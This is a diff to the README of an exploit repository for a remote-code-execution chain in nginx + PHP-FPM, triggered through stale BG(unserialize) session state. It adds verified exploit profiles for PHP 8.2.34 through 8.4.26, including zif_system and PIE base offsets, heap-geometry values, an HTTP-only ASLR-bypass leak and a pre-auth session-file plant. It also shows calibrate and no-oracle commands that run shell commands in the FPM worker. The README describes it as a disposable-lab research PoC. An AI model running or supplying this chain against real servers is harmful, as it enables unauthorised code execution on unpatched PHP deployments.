@@ -3,12 +3,14 @@
 [![CI](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/ci.yml/badge.svg)](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/ci.yml)
 [![Live FPM lab](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/live-fpm.yml/badge.svg)](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/live-fpm.yml)
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![PHP](https://img.shields.io/badge/PHP-8.4.25%2F8.4.26-777bb4.svg)](https://www.php.net/)
+[![PHP](https://img.shields.io/badge/PHP-8.2%20to%208.4%20verified-777bb4.svg)](https://www.php.net/)
 [![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB.svg)](https://www.python.org/)
 
 A self-contained **nginx + PHP-FPM RCE** laboratory and exploit client for the
-cross-request `BG(unserialize)` stale-state chain in **PHP 8.4.25** and
-**PHP 8.4.26**, fixed in **PHP 8.4.27**. This is the FPM-only extraction of
+cross-request `BG(unserialize)` stale-state chain. It ships verified profiles
+for **PHP 8.2.34, 8.3.35, 8.4.0, 8.4.25 and 8.4.26** (fixed upstream in
+8.2.35 / 8.3.36 / 8.4.27 / 8.5.12) plus the pre-auth **session-file plant**
+that covers PHP 5.4-7.x. This is the FPM-only extraction of
 [`devploit/php2shell`](https://github.com/devploit/php2shell): no Apache code,
 no Docker, no root.
 
@@ -17,8 +19,8 @@ no Docker, no root.
 > triggers OOM conditions, and kills PHP-FPM workers. Run it against disposable
 > local laboratories. See [LICENSE](LICENSE).
 
-**Keywords:** PHP-FPM RCE, nginx PHP-FPM exploit, CVE-2026-109619, PHP 8.4.25,
-PHP 8.4.26, PHP 8.4.27, session deserialization, `BG(unserialize)`, stale pointer,
+**Keywords:** PHP-FPM RCE, nginx PHP-FPM exploit, CVE-2026-109619, PHP 8.2,
+PHP 8.3, PHP 8.4, PHP 8.4.27, session deserialization, `BG(unserialize)`, stale pointer,
 use-after-free, ASLR bypass, HTTP-only leak, no-oracle, `zif_system`, FastCGI,
 nginx security research, PHP session upload progress, exploitation laboratory.
 
@@ -50,8 +52,8 @@ nginx security research, PHP session upload progress, exploitation laboratory.
 This repository contains:
 
 - a Python client for the PHP-FPM session/unserialize stale-state chain;
-- a reproducible user-prefix nginx + PHP-FPM laboratory (8.4.25/8.4.26
-  vulnerable and 8.4.27 fixed) that runs without root or Docker;
+- a reproducible user-prefix nginx + PHP-FPM laboratory that runs any built
+  version (7.2 through 8.5) without root or Docker;
 - an HTTP-only leak that recovers the Zend-MM chunk and php-fpm PIE bases from
   a stale session string, removing `/proc/<pid>/mem` from the exploit path;
 - a two-slot, self-correcting endgame that forges a `zend_reference` →
@@ -72,10 +74,10 @@ memsets `BG(unserialize)`:
 
 | Branch | Vulnerable | Fixed | Status in this repository |
 | --- | --- | --- | --- |
-| 8.5 | 8.5.0 – 8.5.11 | 8.5.12 | lab build + remote calibration |
-| 8.4 | 8.4.0 – 8.4.26 | 8.4.27 | **verified profiles (8.4.25, 8.4.26)** |
-| 8.3 | 8.3.0 – 8.3.35 | 8.3.36 | lab build + remote calibration |
-| 8.2 | 8.2.0 – 8.2.34 | 8.2.35 | lab build + remote calibration |
+| 8.5 | 8.5.0 – 8.5.11 | 8.5.12 | builds only (not calibrated) |
+| 8.4 | 8.4.0 – 8.4.26 | 8.4.27 | **verified profiles (8.4.0, 8.4.25, 8.4.26)** |
+| 8.3 | 8.3.0 – 8.3.35 | 8.3.36 | **verified profile (8.3.35)** |
+| 8.2 | 8.2.0 – 8.2.34 | 8.2.35 | **verified profile (8.2.34)** |
 | 8.1 and older (7.x, 5.x) | every release | **never patched** | upstream bug present, but **this chain needs 8.0+** (see below) |
 
 `tools/php2shell_fpm_versions.py` is the single source of truth for that
@@ -86,7 +88,7 @@ marker instead of trusting a version string).
 | Item | Value |
 | --- | --- |
 | Vulnerable builds | any release of the branches above, amd64, nginx + PHP-FPM |
-| Fixed builds | 8.2.35, 8.3.36, 8.4.27, 8.5.12 (`patchcheck` shows them clean) |
+| Fixed builds | 8.2.35, 8.3.36, 8.4.27, 8.5.12 (8.4.27 checked with `patchcheck`) |
 | SAPI | `fpm` only |
 | Profiles | `profiles/<version>-fpm.json`; verified ones carry `"rce": true` |
 | Runtime proof | `uid=1000(...)` from `id` in the FPM worker |
@@ -204,6 +206,7 @@ short-session string into an OOB read primitive for ASLR bases.
 ├── requirements-dev.txt
 └── pyproject.toml
 ```
+
 ## Requirements
 
 - Linux **amd64** (the profile is verified on Debian-style builds).
@@ -333,9 +336,19 @@ $ curl http://127.0.0.1:8110/out/p1
 uid=1000(cryptocalypse) gid=1000(cryptocalypse) groups=...
 ```
 
-The same `leak`, `no-oracle`, `primitive`, and `endgame` commands work on the
-8.4.25 profile at `:8130`/`:8131`; only the PIE base offset and reclaim pads
-differ.
+The same commands work on every shipped profile; only the symbol offsets and
+the heap geometry differ (see [Profile and offsets](#profile-and-offsets)).
+
+`make matrix` verifies the whole unpatched set in one run:
+
+```text
+7.2.34    SESSION PLANT      pre-auth write into sess_<sid>
+7.4.33    SESSION PLANT      pre-auth write into sess_<sid>
+8.2.34    REMOTE RCE         uid=1000(cryptocalypse) ...
+8.3.35    REMOTE RCE         uid=1000(cryptocalypse) ...
+8.4.25    REMOTE RCE         uid=1000(cryptocalypse) ...
+8.4.26    REMOTE RCE         uid=1000(cryptocalypse) ...
+```
 
 The `502` is expected: the worker dies after executing the command and FPM
 respawns it. Do not treat `502` as a failed exploit; check the proof file.
@@ -346,9 +359,18 @@ The lab uses one nginx front and two PHP-FPM pools per build:
 
 | Build | chain HTTP | builder HTTP | chain FPM | builder FPM |
 | --- | --- | --- | --- | --- |
+| 7.2.34 | :8268 | :8269 | :9168 | :9169 |
+| 7.4.33 | :8336 | :8337 | :9236 | :9237 |
+| 8.2.34 | :8406 | :8407 | :9306 | :9307 |
+| 8.3.35 | :8478 | :8479 | :9378 | :9379 |
+| 8.4.0 | :8480 | :8481 | :9380 | :9381 |
 | 8.4.25 | :8130 | :8131 | :9021 | :9022 |
 | 8.4.26 | :8110 | :8111 | :9001 | :9002 |
 | 8.4.27 | :8120 | :8121 | :9011 | :9012 |
+
+Every other built version gets a block of its own from
+`php2shell_fpm_labs.builds_map()`; `labs.py ports`-style output is just that
+mapping.
 
 - **chain** — `memory_limit=8M`, `session.upload_progress.cleanup=On`,
   one static worker. This is the consumer/exploit target.
@@ -363,29 +385,24 @@ All ports bind to `127.0.0.1`. The proof directory
 
 ## Profile and offsets
 
-`profiles/8.4.26-fpm.json` and `profiles/8.4.25-fpm.json` contain the verified
-values:
+Every shipped profile is `verified: true` / `rce: true` and was produced by
+the automatic `calibrate` run against a live build:
 
-| Field | 8.4.26 | 8.4.25 |
-| --- | --- | --- |
-| `zif_system` | `0x386660` | `0x386460` |
-| `zval_ptr_dtor` | `0x54a0d0` | `0x549890` |
-| `basic_globals` | `0xa04660` | `0xa04660` |
-| `bg_unserialize_data_off` | `872` | `872` |
-| `bg_unserialize_level_off` | `880` | `880` |
-| `struct_size` | `8216` | `8216` |
-| `reclaim_pads` | `[4096, 4096, 4096]` | `[4096, 4096]` |
-| `reclaim_size` (oracle) | `12288` | `12288` |
-| `reclaim_size` (no-oracle) | `16384` | `16384` |
-| `no_oracle` candidates | `(0x81000, 0xfe8)`, `(0x82000, 0x1fe8)`, ... | `(0x7f000, 0xfe8)` |
-| leak arm | `/bigvar.php` | `/bigvar.php` |
-| leak pads | `[32768, 16384]` | `[32768, 16384]` |
-| leak forged header | `0x17e8` content offset | `0x17e8` content offset |
-| leak read length | `0x15810` | `0x15810` |
-| chunk pointer offset | `0x77f8` | `0x77f8` |
-| chunk base offset | `0x8b000` | `0x8b000` |
-| PIE pointer offset | `0x157e8` | `0x157e8` |
-| PIE base offset | `0x4ea787` | `0x4e9fc7` |
+| Field | 8.2.34 | 8.3.35 | 8.4.0 | 8.4.25 | 8.4.26 |
+| --- | --- | --- | --- | --- | --- |
+| `zif_system` | `0x3769d0` | `0x37d5f0` | `0x384380` | `0x386460` | `0x386660` |
+| `zval_ptr_dtor` | `0x439120` | `0x446460` | `0x542dd0` | `0x549890` | `0x54a0d0` |
+| `basic_globals` | `0xa15220` | `0xa14e80` | `0xa04580` | `0xa04660` | `0xa04660` |
+| BG data / level offset | `848` / `856` | `856` / `864` | `872` / `880` | `872` / `880` | `872` / `880` |
+| `reclaim_size` | `16384` | `16384` | `12288` | `12288` | `12288` |
+| `no_oracle` candidate | `0x80000`+`0xfe8` | `0x80000`+`0xfe8` | `0x7f000`+`0xfe8` | `0x7f000`+`0xfe8` | `0x7f000`+`0xfe8` |
+| chunk base offset | `0x8c000` | `0x8c000` | `0x8b000` | `0x8b000` | `0x8b000` |
+| PIE base offset | `0x4a2c85` | `0x4b24f6` | `0x4ea787` | `0x4e9fc7` | `0x4ea787` |
+
+Identical on every build: `struct_size` `8216`, `reclaim_pads` `[4096, 4096]`,
+leak arm `/bigvar.php`, leak pads `[32768, 16384]`, forged header `0x17e8`,
+read length `0x15810`, chunk pointer offset `0x77f8`, PIE pointer offset
+`0x157e8`.
 
 Validate the profile:
 
@@ -408,8 +425,8 @@ python3 tools/php2shell_fpm_profile.py \
 
 The generator extracts `zif_system`, `zval_ptr_dtor`, and `basic_globals` with
 `nm`, compiles `tools/php2shell_fpm_offsets.c` against the build's own headers
-for the struct layouts, and parses `php_unserialize_data` from the source tree
-(PHP <= 7.3 gets the `legacy` five-pointer shape). The result is always
+for the struct layouts, and parses `php_unserialize_data` from the source tree.
+The result is always
 `verified: false` / `rce: false`: symbols and layouts do not prove the heap
 geometry, so run `calibrate` before trusting it.
 
@@ -481,14 +498,10 @@ This is arbitrary **session-file write** pre-auth, not RCE by itself: core
 PHP serializes the filename with correct lengths, the `php` serializer
 rejects keys containing `|` (so the key cannot smuggle objects), and the
 files handler validates the session id (`php_session_valid_key`, only
-`[a-zA-Z0-9,-]`), which rules out path traversal. Turning the plant into
-code execution needs an application gadget or a local file include in the
-target.
-
-There is no core-only route to code execution on 7.x: the `php` serializer
-rejects keys containing `|`, the files handler validates the session id, and
-the struct-freeing chain needs PHP >= 8.0. That is why this repository
-reports PHP <= 7.x as *session plant* and reserves RCE for 8.0+.
+`[a-zA-Z0-9,-]`), which rules out path traversal. Turning the plant into code
+execution needs an application gadget or a local file include in the target —
+which is why PHP <= 7.x is reported as *session plant* and RCE is reserved
+for 8.0+, where the struct-freeing chain applies.
 
 ## HTTP-only base leak
 
@@ -502,9 +515,9 @@ The leak is the part that removes the ASLR oracle from the exploit path:
    (chunk pointer) and the `execute_ex` handler table (PIE pointer).
 4. `app.php` reflects `r`; the client dechunks the body, extracts `r\t`, and
    reads the two pointers at fixed offsets.
-5. The client validates alignment and expected address ranges, subtracts
-   `0x8b000` for the chunk and `0x4ea787` for the PIE base, and retries if the
-   worker answered late or died mid-read.
+5. The client validates alignment and expected address ranges, subtracts the
+   profile's `chunk_base_off` and `pie_base_off` for the build, and retries
+   if the worker answered late or died mid-read.
 
 The read is retried because the worker can abort after answering. A failed leak
 is not necessarily a broken lab; re-run `leak` or use `--chunk/--pie` if the
@@ -570,14 +583,17 @@ A single version is verified with the two commands below (the ports come from
 `php2shell_fpm_labs.py builds_map`):
 
 ```sh
-python3 tools/php2shell_fpm_labs.py up --only 7.4.33
-python3 tools/php2shell_fpm.py --version 7.4.33 \
-  --base http://127.0.0.1:8336 --builder http://127.0.0.1:8337 \
+python3 tools/php2shell_fpm_labs.py up --only 8.3.35
+python3 tools/php2shell_fpm.py --version 8.3.35 \
+  --base http://127.0.0.1:8478 --builder http://127.0.0.1:8479 \
   calibrate          # discovers leak + reclaim geometry, writes the profile
-python3 tools/php2shell_fpm.py --version 7.4.33 \
-  --base http://127.0.0.1:8336 --builder http://127.0.0.1:8337 \
+python3 tools/php2shell_fpm.py --version 8.3.35 \
+  --base http://127.0.0.1:8478 --builder http://127.0.0.1:8479 \
   --command 'id>out/p1' --proof-file out/p1 no-oracle
 ```
+
+For PHP <= 7.x use `poison` instead: `calibrate` and `no-oracle` refuse those
+builds.
 
 ## CI/CD
 
@@ -726,9 +742,10 @@ not a generic unauthenticated scanner.
 
 ### Configurations that need adaptation or do not work
 
-- PHP 8.4.27, PHP 8.5.x, or another PHP version/architecture without a matching
-  profile. The bug may still be relevant elsewhere, but this repository's
-  offsets and heap geometry are only verified for 8.4.25/8.4.26 amd64.
+- PHP 8.4.27, PHP 8.5.x, or another PHP version/architecture without a
+  matching profile. The bug may still be relevant elsewhere, but the shipped
+  offsets and heap geometry are only verified for 8.2.34, 8.3.35, 8.4.0,
+  8.4.25 and 8.4.26 on amd64 — run `calibrate` for the rest.
 - A single low-memory pool: the 4 MB arm kills the consumer before the trigger.
 - Redis/Memcached/custom session handlers, `php_serialize`, or session storage
   that is not shared between the two surfaces.
@@ -750,9 +767,9 @@ not a generic unauthenticated scanner.
 - **Local oracle modes.** `endgame` and `primitive` read `/proc/<pid>/mem` and
   need `kernel.yama.ptrace_scope=0`; `no-oracle` does not.
 
-This is a concrete, verified PoC, not a claim that every PHP-FPM 8.4.25/8.4.26
-deployment is exploitable with no adaptation. The underlying bug may affect
-more configurations than this client covers.
+This is a concrete, verified PoC, not a claim that every PHP-FPM deployment
+is exploitable with no adaptation. The underlying bug may affect more
+configurations than this client covers.
 
 ## FAQ
 
@@ -781,10 +798,9 @@ No. `PHP_RINIT(basic)` clears the stale state before the window; `patchcheck`
 shows the fixed build as clean.
 
 **Does it work on PHP 8.5.x?**<br>
-Yes, from 8.5.0 to 8.5.11 (8.5.12 carries the fix). The chain does not depend
-on the branch: `calibrate` derives the leak and reclaim geometry of any build
-over HTTP, and the payload uses the struct layouts of that build's own
-headers.
+8.5.12 carries the fix. The chain does not depend on the branch —
+`calibrate` derives the geometry of any 8.0+ build over HTTP — but no 8.5
+profile ships yet, so run `calibrate` against your build first.
 
 **Can I set the bases manually?**<br>
 Yes:
